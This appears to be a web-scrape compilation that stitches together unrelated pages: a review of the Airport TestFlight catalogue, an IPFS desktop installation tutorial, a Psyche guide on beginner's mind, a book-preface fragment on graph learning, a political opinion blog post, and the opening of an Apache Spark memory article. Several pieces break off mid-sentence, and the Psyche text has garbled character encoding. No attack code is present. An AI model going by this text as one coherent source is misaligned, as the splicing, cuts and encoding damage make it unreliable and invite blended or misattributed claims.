<p>When an app developer wants people to test an application, they can use Apple’s TestFlight service to make a special version of their app installable outside of the App Store, through TestFlight service. People can access a pre-release version of an application by installing it on their device only if they receive an invite for testing purposes. There is a big problem with TestFlight: there is no centralized repository of apps available for testing. This is where Airport comes into play. It is a catalogue of apps that you can install for free on your device. These apps are still in development and are prone to crashing or malfunction. Also, these apps will stop working after 90 days or when the developer decide to remove the build from TestFlight. So, in summary, think of Airport as a front-end catalogue to TestFlight. </p>



<blockquote><p>There is a big problem with TestFlight: there is no centralized repository of apps available for testing.</p></blockquote>



<h2>My personal experience with Airport</h2>



<p>After using Airport for a few days, I can only say that not only this is a brilliant idea, it works really well and its design feels very “Apple-ly”. In fact, I wonder why Apple didn’t come up with this idea. I think they could introduce a new section on the App Store for application testing, something along the line of what Steam offers for games in a pre-release state. I suspect Apple won’t offer something like this as they probably don’t want people to have an easy way to access buggy apps. </p>



<p>At the time of this writing, there are more than 300 apps available. Onboarding an app for testing is simple: you browse the catalogue, tap an app to see the application page with description, screenshots, just like on the App Store, then you hit the Get button in order to launch TestFlight and finish the onboarding process there. The process works perfectly hand in hand with TestFlight. The latter has to be installed on your device, though. </p>



<p>While using Airport , it is easy to forget that you are not browsing the actual App Store. The design of Airport is clean, simple and effective. Bravo to the guys behind this: <a rel="noreferrer noopener" href="https://twitter.com/jsngr?s=21" target="_blank">@jsngr</a> and <a rel="noreferrer noopener" href="https://twitter.com/SiddDevs?s=21" target="_blank">@sidddevs</a>. Now, here is a simple question: will these guys submit Airport to Apple for approval and make it available in the App Store? I’m not sure. Even if they wanted to, will Apple’s review team accept it? It’s far from certain. Apple these days seems very picky and can reject an app pretty easily.</p>

<p>One thing that is cool with Airport is that you can easily find apps that will take advantage of iOS latest APIs and technologies like widgets. So, if you are running iOS 14 on your device <a rel="noreferrer noopener" href="https://numericcitizen.me/2020/07/18/going-all-in-with-ios-14-ipados-14-macos-11-big-sur-and-watchos-7-betas/" target="_blank">as I do</a>, you can also get apps that will take advantage of newly introduced operating system features. Pretty neat. </p>



<h2>Where do we go from here?</h2>



<p>Looking forward, I have to wonder about the future of Airport. Could Apple buy the service and make its own? Probably but very unlikely. Could Apple send a cease and desist order to bring it down? Unfortunately, Apple’s attitude in recent weeks and months makes me think this could happen. I wouldn’t bet against it.</p>



<p>Meanwhile, if you want to have a shot at Airport, you’ll have to register with your email address and… wait. There is a lineup to enter the TestFlight remaining slots. Have fun! </p>

   <!-- Title -->
   
  
   <p>The Interplanetary File System (IPFS) is a peer-to-peer, 
      distributed computer network that can be accessed from the 
      Internet.  Some might call it a new Internet
      separate from the regular Internet.  In a peer-to-peer network, 
      computers talk to each other directly, rather than through a 
      central server.  This makes peer-to-peer networks much less 
      susceptible to censorship of information.  In 2017, when the 
      Turkish government declared Wikipedia to be a 
      <a href="https://web.archive.org/web/20171018092720/http://observer.com/2017/05/turkey-wikipedia-ipfs/">threat to its national security</a> and 
      blocked it in Turkey, a turkish-language copy of Wikipedia was 
      put on the IPFS. 
      Although development of the IPFS is still on-going, and issues still 
      need to be resolved, anyone can use the IPFS for free right now to 
      access information or even to create their own static website, 
      without paying domain name registration fees.</p>

   <div><p>In this article, I will explain how to install software onto your
      computer for accessing the IPFS 
      and show how to access information stored on the IPFS.  I'll leave 
      a tutorial on creating IPFS websites for another time.
   </p></div><h2>Installing the IPFS Desktop onto Your Computer</h2>
   <p>Since many novice computer users are not completely comfortable 
      installing random software from the Internet onto their computers, 
      I'll try to give some of the details they may need to successfully 
      install the IPFS software.  First, the IPFS software runs on 
      Windows, Apple, and Linux 
      computers.  There are two versions, the 
      command line version and the GUI version.  I'll assume that most 
      people would rather run the GUI version, so that is the version on 
      which I will focus our attention.  But, if you prefer the command 
      line version, called "go-ipfs", it can be found 
      <a href="https://dist.ipfs.io/#go-ipfs">here</a>. You do not have 
      to install the command line version before installing the GUI 
      version.</p>

   <p>To install the GUI version of the IPFS software, called "IPFS 
      desktop", go to 
      this Github <a href="https://github.com/ipfs-shipyard/ipfs-desktop">page</a> 
      on the Internet.  Github code is opensource, so Github is generally 
      considered a safe place from which to download code.  I'm not sure 
      about binaries (executable programs), however, so download at your 
      own risk.  Honestly, I doubt there is much risk associated with
      downloading this software from Github or in using it to access the IPFS. 
      Linux users: go two-thirds of the way down the 
      page to the Linux installation packages section, and select the 
      package that is appropriate for your version of Linux.  
      Windows 10 users: download the 64-bit binary of the 
      IPFS desktop labeled "ipfs-desktop-setup-0.8.0.exe".  If a newer 
      version is available by the time you read this article, then install 
      the newer version.  A 32-bit binary version of the IPFS desktop does 
      not appear to be available, so if you are running a 32-bit version 
      of Windows, you will either have to run the 32-bit, command-line 
      version of go-ipfs or download the source code for the IPFS 
      desktop and compile it yourself.</p>

   <p>On Windows, once 
      "ipfs-desktop-setup-0.8.0.exe" is on your hard drive, double click 
      on it to start the installation.  When the blue IPFS desktop 
      icon appears on your Windows desktop, the IPFS desktop has been 
      installed.</p>

   <p>Linux users: on Linux Mint 17, the IPFS desktop installs
      into the /opt/IPFS Desktop directory.  When I installed the IPFS desktop
      onto my Linux machine, despite the fact that the deb package
      installation process produced a message that said all 
      dependencies had been satisfied, libnss3 was
      missing.  After I installed libnss3 (using "sudo apt-get install
      libnss3") and started running the IPFS desktop program, the 
      IPFS desktop blue cube icon appeared on my task bar at the bottom of my
      monitor.</p>

   <h2>Running the IPFS Desktop</h2>
   <div><p>To run the IPFS desktop in Windows, just double click on its icon 
      on your Windows desktop.  Nothing appears to happen, but if you 
      click on the appropriate icon on your Windows menu bar (for Windows 
      7, that's the icon that is used to eject USB devices), you will 
      see the IPFS desktop's blue cube icon.  Left click on that icon 
      and select "status" to bring up the status page of IPFS panel that looks 
      like this: 
   </p></div><center>
   <img src="https://cheapskatesguide.org/pics/ipfs-status-page.jpg" alt="IPFS Status Panel"> 
   </center>

   <p>

      Except perhaps for the IPFS desktop's blue cube icon appearing 
      in a different location on the task bar, the Windows and Linux 
      versions of the IPFS desktop appear to work exactly the same.
      Some of the things the status page shows are:
      </p><ul>
        <li>The installed version of go-ipfs</li>
        <br>

        <li>The amount of storage space taken up on your computer's hard
            drive by IPFS content data files (should currently be 
            something small, like 64 KB)</li>
        <br>

        <li>The number of peers (other computers currently on the IPFS 
            network)</li>
        <br>

        <li>A history of the IPFS network traffic to and from your computer</li>
      </ul>
      

   <p>I noticed a couple of other interesting things on the status page 
      of the IPFS pannel.  One was that a significant amount of traffic 
      appeared as soon as I started running the IPFS desktop for the 
      first time (like a few kb/s outgoing), when I would have thought 
      nothing should have been 
      happening.  And, after 5 minutes or so, I had about 600 KB of 
      IPFS content data files on my hard drive, according to the 
      status page.  Another 
      thing I noticed was that the number of peers varied greatly, from 
      less than ten at times to over 100 at other times.  I don't know 
      why this is, but I would guess that one of the things it means 
      is that you may have to wait for a while before a peer comes on 
      line that has a copy of the file you want.</p>
   <h2>Finding Content on the IPFS Network</h2>
   <p>There are three ways to access information on the IPFS network.  
      The first is by clicking on the "explore" link on the left side of 
      the IPFS desktop panel.  Then click on one of the links to content that 
      come up on the right side of the panel. Then click on the "view on 
      IPFS gateway" link.  Your Internet browser should come up and 
      connect to the page you selected.  This can take a while, because 
      the IPFS network can be slow at times.  Glacially slow.  Downloading a 
      random 800 KB page took me 5 to 10 minutes.  At other times,
      the IPFS network is just as fast as the regular Internet.</p>

   <p>The second way to get to content on the IPFS is to bring up your 
      regular Internet browser and copy and paste an IPFS document 
      address (from wherever you may have found it) onto the browser's 
      URL line.  Naturally, the IPFS desktop must be running for this 
      method to work.  For example, by searching on the regular Internet 
      on duckduckgo.com for "IPFS links", I found this IPFS link to an 
      IPFS blog that explains how to host a website on IPFS: 
      http://127.0.0.1:8080/ipfs/QmdPtC3T7Kcu9iJg6hYzLBWR5XCDcYMY7HV685E3kH3EcS/ .  This 
      is a link to an english language version of the Wikipedia main page 
      on the IPFS: https://ipfs.io/ipfs/QmXoypizjW3WknFiJnKLwHCnL72vedxjQkDDP1mXWo6uco/wiki/ .  
      I noticed, however, that this page does not have a search field 
      or any links to general topics like, art, history, and math.  So, 
      I don't know how to look up a specific topic on this IPFS-hosted 
      version of Wikipedia.  Here is a link to information about the IPFS 
      team's goals for the IPFS version of Wikipedia: https://cloudflare-ipfs.com/ipfs/Qmb6SjJMzkqfKEZxXX5uET64fPkvHHoVUou84m3HAKbeZC/ .
      Regular Internet search engines can be used 
      to find other IPFS websites and music and video 
      files, including the copyrighted kind.  However, given the length 
      of time it sometimes takes data to download over the IPFS network, 
      I question whether anyone would have the patience to wait 
      around while an entire commercial movie downloads.</p>

   <p>The third method of finding content on the IPFS is with an IPFS-dedicated
      search engine called <a href="https://ipfs-search.com/">IPFS Search</a>.
      IPFS Search is a search engine on the regular Internet that gives links 
      to information on the IPFS, just like a regular search engine.  
      IPFS Search 
      also displays information about the last time a particular link was 
      successfully accessed.  When you use it, you will see that most of the 
      content that can be found through IPFS Search was last
      successfully accessed months ago and, therefore, is unlikely to be 
      accessible now.  Other than often having terse 
      titles for listed content, the most noticeable problem with
      IPFS Search is that it has no description below the link to give you a 
      better idea of what information is pointed to by the link.  This
      means it can be difficult to tell whether the link is useful or 
      not before you click on it.</p>
   <h2>Sources of Additional Information</h2>
   <p>Several good sources of information on the IPFS can be found on 
      the regular Internet.  <a href="https://achainofblocks.com/2018/10/05/ipfs-interplanetary-file-system-simply-explained/">This page</a> gives a brief
      history of the IPFS network and explains the basics of how it works.
      A 66-page, pdf manual, called <a href="https://dweb-primer.ipfs.io/decentralized-web-primer.pdf"><i>The 
      Decentralized Web Primer</i></a> is also available.  
      This manual gives more details about the installation of the command
      line version of the IPFS software. It also contains detailed 
      information about how to upload content to the IPFS. 
      You can also find more documentation on the IPFS network 
      <a href="https://docs.ipfs.io/">here</a>.</p> 
   <h2>Last Words about the IPFS</h2>
   <p>From the little experience I've had using the IPFS, the speed at which 
      information can be accessed seems so inconsistent 
      that I can think of only three current uses for it: 1) creating a 
      small, …</p></div></div>

August 27, 2020 | https://psyche.co/guides/how-to-cultivate-shoshin-or-a-beginners-mind | <a href="https://web.archive.org/web/*/https://psyche.co/guides/how-to-cultivate-shoshin-or-a-beginners-mind">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>The Japanese Zen term <em>shoshin</em> translates as â€˜beginnerâ€™s mindâ€™ and refers to a paradox: the more you know about a subject, the more likely you are to close your mind to further learning. As the Zen monk Shunryu Suzuki put it in his book <em>Zen Mind, Beginnerâ€™s Mind</em> (1970): â€˜In the beginnerâ€™s mind there are many possibilities, but in the expertâ€™s there are few.â€™</p>
<p>Many historical examples demonstrate how the expert mind (or feeling like an expert) can lead to closed-mindedness and the obstruction of scientific progress. In 1912, for instance, when the German geophysicist and explorer Alfred Wegener proposed â€“ counter to the received wisdom of the day â€“ that the Earth is made up of shifting continental plates, he was ridiculed by expert geologists around the world. His German compatriots referred to his â€˜delirious ravingsâ€™ while experts in the United States accused him of peddling pseudoscience. It would take decades before the orthodoxy was overturned and the accuracy of his theory was acknowledged.</p>
<p>Similar stories abound. In my own field of neuroscience, for example, belief in the legendary Spanish neuroscientist Santiago RamÃ³n y Cajalâ€™s â€˜harsh decreeâ€™ that adult humans are unable to grow new neurons persisted for decades in the face of mounting contradictory evidence.</p>
<p>Intellectual hubris doesnâ€™t afflict only established scientific experts. Merely having a university degree in a subject can lead people to grossly overestimate their knowledge. In one pertinent <a href="https://onlinelibrary.wiley.com/doi/full/10.1111/cogs.12280">study</a> in 2015, researchers at Yale University asked graduates to estimate their knowledge of various topics relevant to their degrees, and then tested their actual ability to explain those topics. The participants frequently overestimated their level of understanding, apparently mistaking the â€˜peak knowledgeâ€™ they had at the time they studied at university for their considerably more modest current knowledge.</p>
<p>Unfortunately, just as Suzuki wrote and as historical anecdotes demonstrate, there is research evidence that even <em>feeling</em> like an expert also breeds closed-mindedness. Another <a href="https://www.sciencedirect.com/science/article/abs/pii/S0022103115001006?via">study</a> involved giving people the impression that they were relatively expert on a topic (for example, by providing them with inflated scores on a test of political knowledge), which led them to be less willing to consider other political viewpoints â€“ a phenomenon the researchers called â€˜the earned dogmatism effectâ€™.</p>
<p>The consequences of intellectual overconfidence can be seen in the debates surrounding controversial contemporary issues. Take the matter of genetically modified (GM) foods, which are overwhelmingly considered to be safe based on current scientific knowledge. Research has <a href="https://www.nature.com/articles/s41562-018-0520-3">shown</a> that people who hold the strongest anti-GM views, believing that they are harmful, are the most inclined to overestimate their relevant knowledge. Â­</p>
<p>Approaching issues with a beginnerâ€™s mind or a healthy dose of intellectual humility can help to counter the disadvantages of intellectual hubris. People who are more intellectually humble <a href="https://www.tandfonline.com/doi/full/10.1080/17439760.2019.1579359">actually</a> know more, presumably because they are more receptive to new information. Similarly, being intellectually humble is associated with open-mindedness and a greater willingness to be receptive to other peopleâ€™s perspectives â€“ arguably just the tonic that our politically febrile world needs today.</p>
<p>Therefore, fostering your own beginnerâ€™s mind will help you to become more knowledgeable, less overconfident and more willing to engage with others â€“ traits that are also increasingly sought after by leading employers. By practising being flexible rather than dogmatic, more humble and less brazen, you will be sensitive to other peopleâ€™s perspectives and needs, making you a better sister, brother, father, mother, partner and friend. With eyes and mind wide open, itâ€™s so much easier to enjoy the wonders of the world, to grow, to learn and to listen.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p>An important first step towards having a more open mind is to establish a realistic sense of your own knowledge. Countless studies have shown that most of us overestimate our understanding of various topics, everything from how a vacuum cleaner works to the detail of political policies â€“ a phenomenon <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3062901/">called</a> â€˜the illusion of explanatory depthâ€™. Fortunately, there is a very simple way to address this form of intellectual overconfidence and that is to make the effort to explain a relevant issue or topic to yourself or someone else in detail, either out loud or in writing. This exercise makes the gaps in our knowledge more apparent and bursts the illusion of expertise.</p>
<p>If embarking on a full-on explanation sounds impractical or overly arduous, there is a shorthand version you can try. In 2016, psychologists at Washington and Lee University in Virginia <a href="http://dx.doi.org/10.1037/xge0000161">showed</a> that the same beneficial effect could be achieved simply by spending a few seconds reflecting on your ability to explain a given issue to a true expert â€˜in a step-by-step, causally connected manner, with no gaps in your storyâ€™.</p>
<p>Another major hurdle to being open-minded is that we are naturally inclined to seek out information that supports our current views and beliefs â€“ a human foible known as â€˜confirmation biasâ€™. This perpetuates closed-mindedness and makes us ever surer of our own knowledge.</p>
<p>To combat confirmation bias, be aware of it. Constantly remind yourself that it exists, and take active steps to work against it by seeking out information and perspectives that contradict your current position. A <a href="https://psycnet.apa.org/record/1981-07049-001">study</a> published way back in 1980 suggested that actively challenging yourself in this way can be beneficial. Volunteers were presented with trivia questions, such as â€˜the Sabines were part of (a) ancient India or (b) ancient Romeâ€™, and then asked to rate the likelihood that their answers were correct. As expected, the volunteers tended to be overconfident in the accuracy of their answers. However, the researchers found that it was possible to reduce this overconfidence simply by asking their volunteers to list one reason why each of their chosen answers might be wrong. â€˜People who are interested in properly assessing how much they know should work harder in recruiting and weighing evidence,â€™ the researchers wrote. â€˜However, that extra effort is likely to be of little avail unless it is directed toward recruiting contradicting reasons.â€™</p>
<p>The way you think about intelligence and expertise is also relevant to being more open-minded. â€˜Growth mindset theoryâ€™ argues that if we see aptitudes as malleable rather than fixed we are able to learn better. Although the implementation of this theory in formal education has come in for some criticism lately, many continue to see value in the concept, and there is a persuasive logic to the idea that peopleâ€™s perspective on the nature of intelligence is likely to encourage their own intellectual humility.</p>
<p>A series of <a href="https://www.tandfonline.com/doi/full/10.1080/15298868.2017.1361861">studies</a> published in 2018 supported this view, showing that people who were more intellectually humble also tended to have a â€˜growth mindsetâ€™ toward intelligence. This makes sense â€“ if you take the view that intelligence is something youâ€™re either blessed with or youâ€™re not, then acknowledging (or actively seeking to expose) the gaps in your own knowledge and wisdom might be threatening, serving as apparent evidence of your intellectual inferiority. Conversely, if you see intelligence as something to be developed, then finding holes in your knowledge is not so threatening: instead, it opens up exciting new opportunities for learning.</p>
<p>Promisingly, that same 2018 paper showed that it might be possible to foster intellectual humility by encouraging a growth mindset. Asking volunteers to read a scientific article about the malleability of intelligence led them to score higher on a measure of intellectual humility and to be more open to other perspectives, as compared with a control group. â€˜This study suggests that intellectual humility can be at least temporarily enhanced, and points to a growth mindset as a set of beliefs that seems capable of doing so,â€™ the researchers said.</p>
<p>A final, more pleasurable step you can take to increase your intellectual humility comes in the form of deliberately invoking in oneself the emotion of awe. Several studies have shown that awe quietens the ego and prompts epistemological openness â€“ that is, a greater willingness to look at things differently and to recognise the gaps in oneâ€™s knowledge. The emotion also seems to reduce peopleâ€™s need to be satisfied by definite, closed arguments.</p>
<p>Consider a series of <a href="https://psycnet.apa.org/fulltext/2019-46364-001.html">studies</a> published in 2019 that involved volunteers watching awe-inspiring videos of nature or of the night skies â€“ doing so led them to hold beliefs about capital punishment with less conviction; to see political debates as less polarised; and to be more willing to engage with others holding opposing views on immigration. Another <a href="https://www.tandfonline.com/doi/full/10.1080/02699931.2019.1585331">paper</a> published the same year, and that used nature videos and a virtual-reality experience of the aurora borealis to induce awe, found that the emotion led volunteers to be more aware of the gaps in their knowledge, and to take a keener interest in science. Paraphrasing Albert Einstein, the researchers wrote that â€˜one who never experiences awe ceases to discoverâ€™. The message is simple: to increase your open-mindedness, try taking the time to gaze in wonder at the stars.</p></div></div></section><section><div><h2 data-guide-section-number="3"><span>Key points</span></h2><div><ul>
<li> <strong>Explain a theory or idea to yourself or someone else.</strong> Overconfidence in your own knowledge and expertise fuels closed-mindedness. By attempting to explain an idea or argument to someone else, you will get a more realistic sense of what you do and donâ€™t know.</li>

<p>
The field of graph representation learning has grown at an incredible (and sometimes unwieldy) pace over the past seven years, transforming from a small subset of researchers working on a relatively niche topic to one of the fastest growing sub-areas of deep learning.
</p>
<p>
This book is my attempt to provide a brief but comprehensive introduction to graph representation learning, including methods for embedding graph data, graph neural networks, and deep generative models of graphs.

<div>
<p>Those that know me, know that I am both bold and resolute. I stand by my thoughts / comments, yet I attempt to keep an open mind, analyze a situation, self-reflect on any biases, and integrate feedback. I even go so far as to analyze my confidence level, see <a href="https://predictionbook.com/" target="_blank" rel="noopener noreferrer">predictionbook.com</a>.</p>
<p>With that in mind. I want to share how utterly angry and helpless I feel —</p>
<p>I can’t share my true thoughts, hell my analysis, of the current political situation in the U.S. Although I have written on it countless times, I end up deleting the posts.</p>
<p>Why?</p>
<p>It’s not safe to share thoughts.</p>
<h2>State of Affairs</h2>
<p>Today, sharing one’s opinion can cost you your livelihood, your ability to communicate, and more.</p>
<p>Historically, that was always true, perhaps more-so. We’re now returning to the status quo — repression.</p>
<p>Today’s flavor of repression is one where offending someone randomly across the globe, can cost you your job. That person may not have a standing in your community and may not have a relationship with your employer. However, they can amplify their voice, tweet your employer, and your employer (scared out of its mind by the current situation) will terminate you. That is the state of affairs today. It doesn’t matter if you’re correct or innocent. It doesn’t even matter if 99.9% of people aren’t offended by what you said — we are now in a world of “<a href="https://en.wikipedia.org/wiki/Online_shaming#Cancellation" target="_blank" rel="noopener noreferrer">cancel culture</a>“.</p>
<h2>Finding Middle Ground</h2>
<p>In the United States in 2020, we have two paths. One path leads to an ever more left-leaning populous “uprising”; the other path leads to an ever more right-leaning populous “uprising”. I don’t see an alternative, outside of some quite-frankly comical alternatives (e.g. President Mitt Romney, with VP Bernie Sanders).</p>
<p>One way or another, I lose. No one is speaking up for my beliefs or representing me.</p>
<p>I sense I’m not alone. Everyone I speak to left or right, hates the current state of affairs. Most of us even agree on <em>why</em> we distrust the system. Unfortunately, we can’t elect someone to fix the system. Neither Trump, nor Biden, nor Bernie, nor anyone on the ballot accurately represents or even inspires us.</p>
<p>By and large, I believe this is due to the “absolute” nature of our current social strife. Take the question:</p>
<blockquote><p>Why can’t I be anti-vaccine and pro-choice?</p></blockquote>
<p>You would suspect everyone would agree that we “own” our bodies. If that were true, then you would effectively have to be pro-choice AND support people’s right to choose what to put in their bodies; body ownership is the middle ground. I wish we could coalesce around the middle ground, then compromise on edge cases, enabling progress.</p>
<p>Take another example:</p>
<blockquote><p>Why don’t we do firearms training in schools?</p></blockquote>
<p>It’s an honest question — we’ve had the 2nd amendment for hundreds of years. Similar to driving a car, we should train our youth to handle firearms. I suspect we all know the reason this is not occurring — because a significant portion of the United States is fearful of firearms.</p>
<p>From the evidence, the fear is unjustified. We have evidence that with a good training program and robust mental evaluation process, firearms by-and-large are safe for society. <a href="https://en.wikipedia.org/wiki/Firearms_regulation_in_Switzerland" target="_blank" rel="noopener noreferrer">See Switzerland</a>:</p>
<blockquote><p>Swiss males grow up expecting to undergo basic military training, usually at age 20 in the recruit school..</p>
<p>…Prior to 2007, members of the Swiss Militia were supplied with 50 rounds of ammunition for their military weapon in a sealed ammo box that was regularly audited by the government…</p>
<p>…Every person with a Swiss citizenship, aged 10 years or older, can take part at any federal ranges and will be able to shoot for free with the ordinance rifle…</p>
<p>…In 2016, there were 187 attempted and 45 completed homicides, for a homicide rate of 0.50 per 100,000 population, giving Switzerland one of the lowest homicide rates in the world…</p></blockquote>
<p>Further, firearms are already widely available (<a href="https://en.wikipedia.org/wiki/Estimated_number_of_civilian_guns_per_capita_by_country" target="_blank" rel="noopener noreferrer">300+ million guns in the U.S.</a>) &amp; availability enshrined in law.</p>
<p>Sorrowfully, evidence doesn’t matter here; fear guides many. Yoda has some insights here:</p>
<blockquote><p><span data-parade-type="promoarea" data-parade-location-types="promoarea" data-parade-location-ids="article" data-parade-views="false" data-parade-touches="false" data-parade-clicks="false" data-parade-mouseovers="false">Fear is the path to the dark side. Fear leads to anger. Anger leads to hate. Hate leads to suffering.</span></p>
<p>— George Lucas (Yoda)</p></blockquote>
<h2>The False Dichotomy</h2>
<p>I don’t agree with the left or the right on many things in United States politics. In fact, I find most of the arguments a false dichotomy, designed to garner votes. To share one’s full thoughts would cause either or both sides to lash out, even though evidence may support the claims / musings.</p>
<p>Regretfully, this leaves me and many others out of the public discourse. While most of us have heard,</p>
<blockquote><p>The only thing necessary for the triumph of evil is for good men to do nothing.</p>
<p>— Edmund Burke (attributed)</p></blockquote>
<p>It’s not quite that simple and I prefer another sentiment:</p>
<blockquote><p>A man dies when he refuses to stand up for that which is right. A man dies when he refuses to stand up for justice. A man dies when he refuses to take a stand for that which is true.</p>
<p>— Martin Luther King Jr.</p></blockquote>
<center><br>
<iframe data-lazy-type="iframe" data-src="https://www.youtube.com/embed/0On19DRA2fU?start=88" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"><span style="display: inline-block; width: 0px; overflow: hidden; line-height: 0;" data-mce-type="bookmark" class="lazy lazy-hidden mce_SELRES_start">﻿</span></iframe></center><p>Truthfully, we’re all being held hostage. I am very confident few people fully agree with either side in this political theater. We have extremists on either side shouting and being amplified by social media. In truth, the vast majority of us don’t agree [fully] with either extreme. Most of us, want to “live and let live” — that’s the American way. We’re a country founded on our hatred for taxes and the desire to live free from persecution. Please, please.. Don’t let that change.</p>
<p>It’s easy to decide “what’s right” when you look at it through that lens — am I persecuting others or increasing taxes (arguably a form of persecution)? If either are true, likely we should reconsider our stance.</p>
<h2>The Chaos</h2>
<p>Today, we are edging towards chaos. We all feel it. Riots, job loss, deadly diseases, [trade] wars, homelessness… We need leadership that can unite us.</p>
<p>Unfortunately, many of our would-be leaders have opted out or have been pushed out of this system. They’ve become engineers, scientists, bloggers — too scared to share their opinions (<a href="https://en.wikipedia.org/wiki/Slate_Star_Codex" target="_blank" rel="noopener noreferrer">even shutting down</a>). To hold a nuanced opinion different from the “socially accepted” by one group or another will get you “canceled”. In this case, “canceled” can mean anything from losing your job, to losing financial platforms/instruments (i.e. PayPal, VISA, YouTube revenue, etc.), to receiving threats on your life.</p>
<p>We have an ongoing pandemic, with millions in the United States likely about to perish, the economy collapsing, and we still cannot escape the politics.</p>
<p>I’m not hopeful.</p>
<p>I have so many musings, stories, and analyses I’d like to share, but neither facts nor my opinions matter.</p>
<p>Let’s be honest —</p>
<ul>
<li>I’m a white, cisgender, straight, male</li>
<li>I work as a technical manager in a research group, at a bank</li>
<li>I’m socially liberal in many ways and conservative in others</li>
<li>I grew up lower-middle class; now, I’m upper-middle class</li>
<li>I don’t attribute myself to any political party</li>
</ul>
<p>A large number of people dismiss or overlook me because of my background. Those who don’t outright dismiss me are also not likely to support my interest(s).</p>
<h2>Meritocracy or Bust</h2>
<p>What scares me is that I am a father and I am fearful for my children’s future. I was raised with the understanding that America is a meritocracy. Regardless of your race, gender, or creed, you should have the ability to make a life in the United States,<strong><em> to build a future for your children</em></strong>. Sadly, I don’t see the same core mission today. None of the political parties or the government at large appears forward-looking, for the children. Perhaps, that’s because of a <a href="https://www.cdc.gov/nchs/nvss/births.htm" target="_blank" rel="noopener noreferrer">declining birthrate</a>, I’m not sure.</p>
<p>As someone with children, I’m pleading for a group to come together to challenge the current status quo and equitably look to improve our society. We do have systemic problems that need to be fixed. Compromises will need to be made, but I don’t believe we need sacrifices from anyone.</p>
<p>The racism and sexism needs to stop. I suspect, most of us (though, not all) want a meritocracy, a hierarchy based on merit. Unfortunately, what’s being propagated is a hierarchy based on race, sex and orientation — the under-privileged. It’s clear from the countless stories we see in the news. I am sure you are tired of the racism, as am I. That’s probably true regardless of which side of the political spectrum you fall.</p>
<p><em>No one’s</em> value to society should be assessed by their race, gender or creed. A person’s value should be based off what they have to offer to a given group, organization, or society. We can rally around that idea (that we’re all equal, differentiated on merit) and work to improve. It’s a middle ground we can [mostly] agree on. From there, we can fix the injustices.</p>
<p>What horrifies me, is that even to express that <em>“we’re all equal” </em>is a challenge to this new socio-economic hierarchy. <em>No one</em> is representing me or has my family’s best interests in mind. Realistically, I don’t expect anyone to have <em>my family’s interests</em> in mind, but I don’t want my potential / rights eroded.</p>
<p>Due to this political tug of war, both sides of the political spectrum want to diminish our rights; they’re only bickering over which rights to diminish. Let’s stop this tug of war and come together.</p>
<p>If we don’t come together, soon enough we won’t have a democracy, or frankly, a future to build for.</p>
<h2>In the Words of John Adams…</h2>
<blockquote><p>Remember, democracy never lasts long. It soon wastes, exhausts, and murders itself. There never was a democracy yet that did not commit suicide. It is in vain to say that democracy is less vain, less proud, less selfish, less ambitious, or less avaricious than aristocracy or monarchy. It is not true, in fact, and nowhere appears in history. Those passions are the same in all men, under all forms of simple government, and when unchecked, produce the same effects of fraud, violence, and cruelty. When clear prospects are opened before vanity, pride, avarice, or ambition, for their easy gratification, it is hard for the most considerate philosophers and the most conscientious moralists to resist the temptation. Individuals have conquered themselves. Nations and large bodies of men, never.</p>

			<p><em>Edit from 2015/12/17: Memory model described in this article is deprecated starting Apache Spark 1.6+, the new memory model is based on UnifiedMemoryManager&nbsp;and described in <a href="https://0x0fff.com/spark-memory-management/" target="_blank">this article</a></em></p>
<p>Over the recent time I’ve answered a series of questions related to ApacheSpark architecture on StackOverflow. All of them seem to be caused by the absence of a good general description of the Spark architecture in the internet. Even official guide does not have that many details and of cause it lacks good diagrams. Same for the “Learning Spark” book and the materials of official workshops.</p>
<p>In this article I would try to fix this and provide a single-stop shop guide for Spark architecture in general and some most popular questions on its concepts. This article is not for complete beginners – it will not provide you an insight on the Spark main programming abstractions (RDD and DAG), but requires their knowledge as a prerequisite.</p>
<p>This is the first&nbsp;article in a series. The second one regarding shuffle <a href="https://0x0fff.com/spark-architecture-shuffle/" target="_blank">is available here</a>. The third one about new memory management model <a href="https://0x0fff.com/spark-memory-management/" target="_blank">is available here</a>.</p>

<p>Let’s start with the official picture available on the <a href="http://spark.apache.org/docs/1.3.0/cluster-overview.html">http://spark.apache.org/docs/1.3.0/cluster-overview.html</a>:</p>
<p><a href="https://i0.wp.com/0x0fff.com/wp-content/uploads/2015/03/Spark-Architecture-Official.png"><img src="https://i0.wp.com/0x0fff.com/wp-content/uploads/2015/03/Spark-Architecture-Official-300x140.png?resize=300%2C140" alt="Spark Architecture Official" width="300" height="140" srcset="https://i0.wp.com/0x0fff.com/wp-content/uploads/2015/03/Spark-Architecture-Official.png?resize=300%2C140&amp;ssl=1 300w, https://i0.wp.com/0x0fff.com/wp-content/uploads/2015/03/Spark-Architecture-Official.png?w=607&amp;ssl=1 607w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1"></a></p>
<p>As you might see, it has many terms introduced at the same time – “executor”, “task”, “cache”, “Worker Node” and so on. When I started to learn the Spark concepts some time ago, it was almost the only picture about Spark architecture available over the internet and now the things didn’t change much. I personally don’t really like this because it does not show some important concepts or shows them not in the best way.</p>
<p>Let’s start from the beginning. Any, any Spark process that would ever work on your cluster or local machine is a JVM process. As for any JVM process, you can configure its heap size with <em>-Xmx</em> and <em>-Xms</em> flags of the JVM. How does this process use its heap memory and why does it need it at all? Here’s the diagram of Spark memory allocation inside of the JVM heap:</p>
<p><img src="https://i0.wp.com/0x0fff.com/wp-content/uploads/2015/03/Spark-Heap-Usage.png?resize=475%2C631" alt="Spark Heap Usage" width="475" height="631" srcset="https://i0.wp.com/0x0fff.com/wp-content/uploads/2015/03/Spark-Heap-Usage.png?w=475&amp;ssl=1 475w, https://i0.wp.com/0x0fff.com/wp-content/uploads/2015/03/Spark-Heap-Usage.png?resize=226%2C300&amp;ssl=1 226w" sizes="(max-width: 475px) 100vw, 475px" data-recalc-dims="1"></p>
